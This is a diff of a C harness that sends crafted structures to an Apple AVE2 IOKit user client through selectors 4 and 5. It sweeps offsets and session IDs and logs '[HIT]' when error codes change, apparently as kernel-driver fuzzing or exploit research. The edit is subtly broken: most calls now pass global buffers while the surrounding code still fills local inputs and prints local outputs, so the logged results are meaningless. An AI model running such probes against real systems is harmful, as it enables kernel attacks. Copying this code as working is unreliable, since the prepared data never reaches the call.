@@ -50,6 +50,11 @@ static void dump_out(const uint8_t *out, size_t osz, size_t n) {
 }
 
 static uint8_t  stat_in[0x1a0c0];
+static uint8_t  g_sid_d5[0x1a0b0];
+static uint8_t  g_sid_sub[0x1a0a0];
+static uint8_t  g_sid_o4[0x40];
+static uint8_t  g_sid_o5[0x150];
+
 static uint8_t  anon_in[0x1a0c0];
 static uint8_t  in[0x6f0];
 static uint8_t  out[0x400];
@@ -256,7 +261,7 @@ static void state_walk(io_connect_t c) {
     { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
       { const char *ix = getenv("AVE2_S5_IDX28"); if (ix && atoi(ix)) *(uint32_t *)(d5 + 0x28) = 1; }  /* v38: keep "904.76.7" at in+0x28 (validator memcmp) */
       uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-      kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+      kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
       printf("    sel5 -> 0x%08x %s osz=%zu out0:", k5, krname(k5), o5z);
       for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
       printf("\n"); }
@@ -498,7 +503,7 @@ int main(void) {
             *(uint32_t *)(d5 + 0x28) = sid_auto; printf("    [sid] using 0x%x\n", sid_auto);
             memcpy(d5 + 0x30, stat_in, 0x1a080);
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
             printf("    sel5[%d/%d] -> 0x%08x %s osz=%zu out0:%02x%02x%02x%02x\n", rep + 1, s5n,
                    k5, krname(k5), o5z, o5[0], o5[1], o5[2], o5[3]);
           }
@@ -528,7 +533,7 @@ int main(void) {
               *(uint32_t *)(d5 + 0x28) = 1;
               *(uint32_t *)(d5 + o) = pv;
               uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
               if (k5 != 0xe0000001u) {
                 printf("[HIT] o=0x%x sel4=0x%08x sel5=0x%08x %s out0:%02x%02x%02x%02x\n",
                        o, k4, k5, krname(k5), o5[0], o5[1], o5[2], o5[3]);
@@ -562,7 +567,7 @@ int main(void) {
               default: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a4) = 1; break;
               }
               uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
               printf("    shape %d sel4=0x%08x sel5=0x%08x %s out0:%02x%02x%02x%02x\n", shape, k4, k5, krname(k5), o5[0], o5[1], o5[2], o5[3]);
               if (k5 != 0xe0000001u) hits++;
             }
@@ -603,7 +608,7 @@ int main(void) {
             uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5)); memcpy(d5, stat_in, 0x1a0a0);
             *(uint32_t *)(d5 + 0x28) = 1;
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
             printf("    [s5] sel5 -> 0x%08x osz=%zu out0:", k5, o5z);
             for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
             printf("\n");
@@ -656,7 +661,7 @@ int main(void) {
                 if (e0 && e0[0]) *(uint32_t *)(d5 + 0x3e0) = (uint32_t)strtoul(e0, 0, 0); }
               memcpy(d5 + 0x30, stat_in, 0x1a080);      /* Prepare payload */
               uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
               /* v52: HIT only when configure succeeded AND sel5 code moved */
               if (k4 == 0 && k5 != 0xe0000001u && k5 != 0xe00002d9u) {
                 printf("[HIT] o=0x%x sel5=0x%08x\n", o, k5);
@@ -720,7 +725,7 @@ int main(void) {
               }
             }
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
             printf("    [s5-%d] sel5 -> 0x%08x osz=%zu out0:", casei, k5, o5z);
             for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
             printf("\n");
@@ -743,7 +748,7 @@ int main(void) {
               *(uint32_t *)(d5 + 0x28) = 1;
               *(uint32_t *)(d5 + offs[i]) = 1;
               uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
               printf("    [scan +%#x] sel5 -> 0x%08x out0:", offs[i], k5);
               for (size_t q = 0; q < 8 && q < o5z; q++) printf("%02x", o5[q]);
               printf("\n");
@@ -1111,7 +1116,7 @@ int main(void) {
             }
             uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
             uint8_t sub[0x1a0a0]; memset(sub, 0, sizeof(sub));
-            memcpy(sub, stat_in, 0x1a0a0);
+            memcpy(g_sid_sub, stat_in, 0x1a0a0);
             if (patch) apply_patch(sub, patch);
             if (h5sid) { *(uint32_t *)(sub + 0x2c) = 5;         /* Check_Start pIn=in+0x38 → cmd@abs+0x3c (sub@+0x10 shift) */
                          *(uint32_t *)(sub + 0x3c) = 5;         /* case6 (sub@+0): abs+0x3c */
@@ -1128,7 +1133,7 @@ int main(void) {
             }
             if (casei == 6) {
                 /* 对照：不搬移，结构体仍在 +0，只把 +0x04 写成 5 */
-                memcpy(d5, sub, 0x1a0a0);
+                memcpy(g_sid_d5, g_sid_sub, 0x1a0a0);
                 *(uint32_t *)(d5 + 0x04) = 5;
             } else {
                 memcpy(d5 + 0x10, sub, 0x1a0a0);
@@ -1149,7 +1154,7 @@ int main(void) {
               int fdelay = getenv("AVE2_H5FDELAY") ? atoi(getenv("AVE2_H5FDELAY")) : 200;
               for (int fi = 0; fi < nfires; fi++) {
                 o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-                k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+                k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
                 printf("    [h5-%d f%d] sel5 -> 0x%08x %s osz=%zu out0:", casei, fi, k5, krname(k5), o5z);
                 for (size_t q = 0; q < 24 && q < o5z; q++) printf("%02x", o5[q]);
                 printf("\n");
@@ -1219,7 +1224,7 @@ int main(void) {
                 *(uint32_t *)(d5 + 0x278) = 4;
             }
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
             printf("    [%s%s] sel5 -> 0x%08x %s osz=%zu out0:", tag, lrb?" LRB":"", k5, krname(k5), o5z);
             for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
             printf("\n");
@@ -1252,17 +1257,17 @@ s5done:
                     drain_wake(wake, 5);
                     fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
                     *(uint32_t *)(stat_in + off) = SID;
-                    uint8_t o4[0x40]; size_t o4z = 0x40; memset(o4, 0xAA, sizeof(o4));
-                    kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, stat_in, 0x1a0a0, o4, &o4z);
+                    size_t o4z = 0x40; memset(g_sid_o4, 0xAA, sizeof(g_sid_o4));
+                    kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, stat_in, 0x1a0a0, g_sid_o4, &o4z);
                     if (k4 == 0) {
-                        static uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
-                        static uint8_t sub[0x1a0a0]; memset(sub, 0, sizeof(sub));
-                        memcpy(sub, stat_in, 0x1a0a0);
-                        *(uint32_t *)(sub + 0x04) = 5;
-                        *(uint32_t *)(sub + 0x28) = SID;
-                        memcpy(d5, sub, 0x1a0a0);
-                        static uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-                        kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+                        memset(g_sid_d5, 0, sizeof(g_sid_d5));
+                        memset(g_sid_sub, 0, sizeof(g_sid_sub));
+                        memcpy(g_sid_sub, stat_in, 0x1a0a0);
+                        *(uint32_t *)(g_sid_sub + 0x04) = 5;
+                        *(uint32_t *)(g_sid_sub + 0x28) = SID;
+                        memcpy(g_sid_d5, g_sid_sub, 0x1a0a0);
+                        size_t o5z = 0x150; memset(g_sid_o5, 0xAA, sizeof(g_sid_o5));
+                        kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
                         if (k5 != 0xe0000001u && k5 != 0xe00002d9u) {
                             printf("[sidsweep] *** HIT off=0x%04x sel4=0 sel5=0x%08x (%s)\n",
                                    off, k5, krname(k5));
@@ -1353,7 +1358,7 @@ s5done:
             *(uint32_t *)(d5 + 0x28) = 1;
             for (int r = 0; r < 3; r++) {
                 uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-                kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+                kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, g_sid_d5, sizeof(g_sid_d5), g_sid_o5, &o5z);
                 printf("  [x2 r%d] sel5 -> 0x%08x %s osz=%zu out0:", r, k5, krname(k5), o5z);
                 for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
                 puts("");
